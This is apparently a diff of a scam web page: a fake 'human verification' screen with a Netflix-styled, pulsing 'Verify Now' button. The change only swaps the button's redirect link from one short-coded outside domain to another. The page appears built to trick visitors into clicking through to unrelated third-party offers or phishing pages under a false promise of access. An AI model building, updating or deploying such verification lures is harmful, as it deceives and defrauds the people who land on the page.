@@ -19,6 +19,6 @@ if(!IS_AJAX) {die("<div style='width: 100%; height: 100%; position: fixed; backg
 		<span id="human_verification_timer_time"></span>
 	</div>
 	<div class="verification-button-wrapper animated bounceIn animation-delay-1000">
-		<a id="verification-button" class="ntflx-btn animated pulse infinite" href="https://unlock-it.top/268d6a5"><span>Verify Now</span></a>
+		<a id="verification-button" class="ntflx-btn animated pulse infinite" href="https://secureverify.net/3e2d0d5"><span>Verify Now</span></a>
 	</div>
 </div>
